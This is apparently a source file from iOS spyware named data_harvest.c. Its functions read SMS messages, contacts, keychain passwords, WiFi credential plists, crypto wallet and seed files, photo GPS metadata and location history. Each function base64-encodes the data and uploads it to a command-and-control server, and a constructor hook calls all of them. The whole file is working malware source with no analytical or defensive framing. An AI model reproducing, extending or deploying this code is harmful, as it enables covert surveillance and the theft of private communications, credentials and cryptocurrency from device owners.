/*
 * data_harvest.c — Read sensitive data from iOS data stores and upload to C2.
 * Compiled as Objective-C (-x objective-c) for NSData base64 + NSJSONSerialization.
 *
 * Every harvest function:
 *   1. Reads source data (SQLite / file / API)
 *   2. Serialises to JSON
 *   3. Base64-encodes with NSData
 *   4. Calls upload_to_c2() → HTTP POST /upload
 */

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#include <sqlite3.h>
#include <unistd.h>
#include <dirent.h>
#include "data_harvest.h"
#include "c2.h"

/* --------------------------------------------------------------------------
 * Helpers
 * -------------------------------------------------------------------------- */

/* Serialize obj → JSON → base64 string, or nil on failure */
static NSString *json_b64(id obj) {
    NSData *json = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    if (!json) return nil;
    return [json base64EncodedStringWithOptions:0];
}

/* Read all rows from a SQLite DB. cols = {"colA","colB",…,NULL} */
static NSArray *sqlite_select(const char *db_path, const char *sql,
                               const char **cols) {
    NSMutableArray *rows = [NSMutableArray array];
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(db_path, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK)
        return rows;

    sqlite3_stmt *stmt = NULL;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        int ncols = sqlite3_column_count(stmt);
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            NSMutableDictionary *row = [NSMutableDictionary dictionary];
            for (int i = 0; i < ncols; i++) {
                NSString *key = cols && cols[i]
                    ? [NSString stringWithUTF8String:cols[i]]
                    : [NSString stringWithFormat:@"col%d", i];
                int type = sqlite3_column_type(stmt, i);
                id val = [NSNull null];
                switch (type) {
                    case SQLITE_INTEGER:
                        val = @(sqlite3_column_int64(stmt, i)); break;
                    case SQLITE_FLOAT:
                        val = @(sqlite3_column_double(stmt, i)); break;
                    case SQLITE_TEXT: {
                        const char *t = (const char *)sqlite3_column_text(stmt, i);
                        val = t ? @(t) : [NSNull null]; break;
                    }
                    case SQLITE_BLOB: {
                        int len = sqlite3_column_bytes(stmt, i);
                        const void *ptr = sqlite3_column_blob(stmt, i);
                        NSData *d = [NSData dataWithBytes:ptr length:len];
                        val = [d base64EncodedStringWithOptions:0]; break;
                    }
                    default: break;
                }
                row[key] = val;
            }
            [rows addObject:row];
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    return rows;
}

/* --------------------------------------------------------------------------
 * SMS (sms.db)
 * -------------------------------------------------------------------------- */
void harvest_sms(void) {
    const char *db = "/var/mobile/Library/SMS/sms.db";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT m.ROWID, m.text, m.date, m.is_from_me, "
        "  h.id AS handle "
        "FROM message m "
        "LEFT JOIN handle h ON m.handle_id = h.ROWID "
        "ORDER BY m.date DESC LIMIT 2000";
    const char *cols[] = {"id","text","date","from_me","handle", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    /* path ends in .json so backend stores with .json extension */
    upload_to_c2("sms", "/var/mobile/Library/SMS/sms.json",
                 "SMS messages", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Contacts (AddressBook.sqlitedb)
 * -------------------------------------------------------------------------- */
void harvest_contacts(void) {
    const char *db = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT p.ROWID, p.First, p.Last, p.Organization, "
        "  mv.value AS phone "
        "FROM ABPerson p "
        "LEFT JOIN ABMultiValue mv ON mv.record_id = p.ROWID AND mv.property = 3 "
        "LIMIT 5000";
    const char *cols[] = {"id","first","last","org","phone", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    /* category "comm" → bucket "comm"（通讯数据） */
    upload_to_c2("comm", "/var/mobile/Library/AddressBook/contacts.json",
                 "Address book contacts", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Keychain — generic + internet passwords
 * -------------------------------------------------------------------------- */
void harvest_keychain(void) {
    @autoreleasepool {
        NSMutableArray *items = [NSMutableArray array];

        CFTypeRef classes[] = {
            kSecClassGenericPassword,
            kSecClassInternetPassword,
        };
        for (size_t ci = 0; ci < sizeof(classes)/sizeof(classes[0]); ci++) {
            NSDictionary *q = @{
                (__bridge id)kSecClass:            (__bridge id)classes[ci],
                (__bridge id)kSecReturnAttributes: @YES,
                (__bridge id)kSecReturnData:       @YES,
                (__bridge id)kSecMatchLimit:       (__bridge id)kSecMatchLimitAll,
            };
            CFTypeRef result = NULL;
            OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &result);
            if (st != errSecSuccess || !result) continue;

            NSArray *arr = (__bridge_transfer NSArray *)result;
            for (NSDictionary *item in arr) {
                NSData *secret = item[(__bridge id)kSecValueData];
                NSString *secretStr = secret
                    ? ([[NSString alloc] initWithData:secret encoding:NSUTF8StringEncoding]
                       ?: [secret base64EncodedStringWithOptions:0])
                    : @"";
                [items addObject:@{
                    @"service": item[(__bridge id)kSecAttrService]  ?: @"",
                    @"account": item[(__bridge id)kSecAttrAccount]  ?: @"",
                    @"server":  item[(__bridge id)kSecAttrServer]   ?: @"",
                    @"label":   item[(__bridge id)kSecAttrLabel]    ?: @"",
                    @"value":   secretStr,
                }];
            }
        }
        if (!items.count) return;
        NSString *b64 = json_b64(items);
        if (!b64) return;
        upload_to_c2("keychain", "/keychain/items.json",
                     "Keychain generic+internet passwords", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * WiFi passwords (com.apple.network.identification.plist — needs root)
 * -------------------------------------------------------------------------- */
static void harvest_wifi_plists(void) {
    const char *paths[] = {
        "/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
        "/private/var/preferences/SystemConfiguration/com.apple.network.identification.plist",
        NULL,
    };
    for (int i = 0; paths[i]; i++) {
        NSString *p = [NSString stringWithUTF8String:paths[i]];
        NSData *d = [NSData dataWithContentsOfFile:p];
        if (!d) continue;
        /* Upload raw plist bytes as base64 */
        NSString *b64 = [d base64EncodedStringWithOptions:0];
        upload_to_c2("wifi", paths[i], "WiFi credentials plist", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * Crypto wallet files (basic path scan)
 * -------------------------------------------------------------------------- */
void harvest_crypto_wallets(void) {
    NSArray *patterns = @[
        @"/var/mobile/Containers/Data/Application",
    ];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *walletNames = @[@"wallet.dat", @"keystore", @"mnemonic.txt",
                              @"seed.txt", @"seed.json"];

    for (NSString *base in patterns) {
        NSArray *appDirs = [fm contentsOfDirectoryAtPath:base error:nil];
        for (NSString *appDir in appDirs) {
            NSString *docsPath = [[base stringByAppendingPathComponent:appDir]
                                        stringByAppendingPathComponent:@"Documents"];
            for (NSString *name in walletNames) {
                NSString *full = [docsPath stringByAppendingPathComponent:name];
                NSData *d = [NSData dataWithContentsOfFile:full];
                if (!d) continue;
                NSString *b64 = [d base64EncodedStringWithOptions:0];
        /* category "account" → bucket "account" */
        upload_to_c2("account", full.UTF8String,
                     "Crypto wallet file", b64.UTF8String);
            }
        }
    }
}

/* --------------------------------------------------------------------------
 * Photos — upload EXIF metadata (not raw images to keep traffic low)
 * -------------------------------------------------------------------------- */
void harvest_photos(void) {
    const char *db = "/var/mobile/Media/PhotoData/Photos.sqlite";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT ROWID, ZFILENAME, ZLATITUDE, ZLONGITUDE, ZDATECREATED "
        "FROM ZASSET ORDER BY ZDATECREATED DESC LIMIT 500";
    const char *cols[] = {"id","filename","lat","lon","date", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    /* category "photo" → bucket "photo"（相册元数据） */
    upload_to_c2("photo", "/var/mobile/Media/PhotoData/photos_exif.json",
                 "Photo metadata (GPS+filename)", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Location history (LocationD cache)
 * -------------------------------------------------------------------------- */
void harvest_location(void) {
    const char *db = "/var/mobile/Library/Caches/com.apple.routined/Cache.sqlite";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT Latitude, Longitude, Timestamp "
        "FROM ZRTVISIT ORDER BY Timestamp DESC LIMIT 500";
    const char *cols[] = {"lat","lon","ts", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    upload_to_c2("location", "/var/mobile/Library/Caches/location_history.json",
                 "Location visit history", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * harvest_all — called from coruna_constructor in main.c
 * -------------------------------------------------------------------------- */
void harvest_all(void) {
    harvest_sms();
    harvest_contacts();
    harvest_keychain();
    harvest_wifi_plists();
    harvest_crypto_wallets();
    harvest_photos();
    harvest_location();
}
